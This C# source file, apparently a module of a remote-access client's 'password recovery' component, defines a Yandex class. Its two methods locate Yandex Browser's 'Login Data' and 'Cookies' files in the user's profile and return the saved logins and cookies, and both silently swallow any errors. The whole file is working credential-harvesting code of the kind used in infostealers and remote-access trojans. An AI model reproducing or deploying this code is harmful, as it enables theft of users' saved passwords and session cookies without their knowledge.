using System;
using System.Collections.Generic;
using System.IO;
using xClient.Core.Recovery.Helper;

namespace PasswordRecovery.Browsers
{
    public class Yandex
    {
        public static List<LoginInfo> Passwords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
                return ChromiumBase.Passwords(datapath, "Yandex");
            }
            catch (Exception)
            {
                return new List<LoginInfo>();
            }
        }
        public static List<ChromiumBase.ChromiumCookie> Cookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Cookies");
                return ChromiumBase.Cookies(datapath, "Yandex");
            }
            catch (Exception)
            {
                return new List<ChromiumBase.ChromiumCookie>();
            }
        }

    }
}
